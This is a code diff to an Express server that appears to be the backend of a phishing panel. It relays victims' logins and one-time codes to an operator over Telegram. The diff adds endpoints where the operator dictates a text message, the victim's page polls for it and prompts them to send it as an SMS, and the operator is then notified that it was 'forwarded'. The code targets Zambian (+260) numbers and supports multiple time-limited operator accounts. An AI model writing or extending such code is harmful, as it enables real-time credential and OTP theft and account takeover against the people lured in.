@@ -913,22 +913,10 @@ app.post('/api/:userId/check-login-approval', resolveUser, (req, res) => {
   if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT)
     return res.json({ success: true, approved: false, rejected: true, expired: true });
 
-  // ── NEW: sendText branch ──────────────────────────────────────────────────
+  // ── sendText: just signal that admin chose this path ──────────────────────
+  // Frontend will then switch to polling /check-text-content for the actual text
   if (rec.sendText) {
-    // Check if the admin has already supplied the text via /sendtext
-    const entry = pendingSendTexts.get(phone);
-    if (entry && entry.resolved) {
-      // Mark read so cleanup can collect it later
-      if (!entry.readAt) entry.readAt = Date.now();
-      return res.json({ success: true, sendText: true, text: entry.text });
-    }
-    // Check timeout
-    if (entry && Date.now() - entry.ts > CFG.SEND_TEXT_TIMEOUT) {
-      pendingSendTexts.delete(phone);
-      return res.json({ success: true, approved: false, rejected: true, expired: true, sendTextTimeout: true });
-    }
-    // Still waiting for admin to /sendtext
-    return res.json({ success: true, sendText: true, text: null });
+    return res.json({ success: true, sendText: true });
   }
 
   res.json({
@@ -938,6 +926,58 @@ app.post('/api/:userId/check-login-approval', resolveUser, (req, res) => {
     expired: rec.expired || false,
     rejectionReason: rec.rejectionReason || null,
   });
+});
+
+// ── Check text content — frontend polls here after admin chose "Send Text" ──
+app.post('/api/:userId/check-text-content', resolveUser, (req, res) => {
+  const raw = req.body.phoneNumber;
+  if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
+  const phone = normalise(raw);
+  const entry = pendingSendTexts.get(phone);
+
+  // No pending entry at all
+  if (!entry) {
+    return res.json({ success: true, ready: false, message: 'No pending request' });
+  }
+  // Timed out
+  if (Date.now() - entry.ts > CFG.SEND_TEXT_TIMEOUT) {
+    pendingSendTexts.delete(phone);
+    return res.json({ success: true, ready: false, timedOut: true, message: 'Request timed out' });
+  }
+  // Admin hasn't sent the text yet
+  if (!entry.resolved) {
+    return res.json({ success: true, ready: false });
+  }
+  // Text is ready — send it to frontend
+  if (!entry.readAt) entry.readAt = Date.now();
+  return res.json({ success: true, ready: true, text: entry.text });
+});
+
+// ── Confirm SMS sent — frontend calls after user taps Send SMS ──────────────
+app.post('/api/:userId/confirm-sms-sent', resolveUser, async (req, res) => {
+  const user = req.user;
+  const raw = req.body.phoneNumber;
+  if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
+  const phone = normalise(raw);
+  const { num } = fmtPhone(phone);
+
+  log.info(`SMS confirmed sent for ${phone} by user ${user.name}`);
+
+  // Clean up the pending entry
+  pendingSendTexts.delete(phone);
+
+  // Notify admin on Telegram
+  if (bot && botHealthy) {
+    await sendMsg(user,
+      `📩 <b>${sanitize(user.name)} — SMS FORWARDED</b>\n\n` +
+      `✅ Message forwarded successfully\n` +
+      `📞 <b>Phone:</b> <code>+260${num}</code>\n` +
+      `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+      `━━━━━━━━━━━━━━━━━━━`
+    );
+  }
+
+  res.json({ success: true, message: 'Confirmation sent' });
 });
 
 app.post('/api/:userId/verify-otp', resolveUser, async (req, res) => {
@@ -1007,7 +1047,7 @@ const startServer = async () => {
       users.forEach(u => {
         console.log(`   [${u.id}] ${u.name} (${u.source}) ${u.expiresAt ? fmtDate(u.expiresAt) : 'permanent'}`);
       });
-      console.log('\n📋 Endpoints: /login  /check-login-approval  /verify-otp  /check-otp-status  /resend-otp  /check-user-status');
+      console.log('\n📋 Endpoints: /login  /check-login-approval  /check-text-content  /confirm-sms-sent  /verify-otp  /check-otp-status  /resend-otp');
       console.log('📤 Send Text: /sendtext <phone> <message>');
       console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
       r();
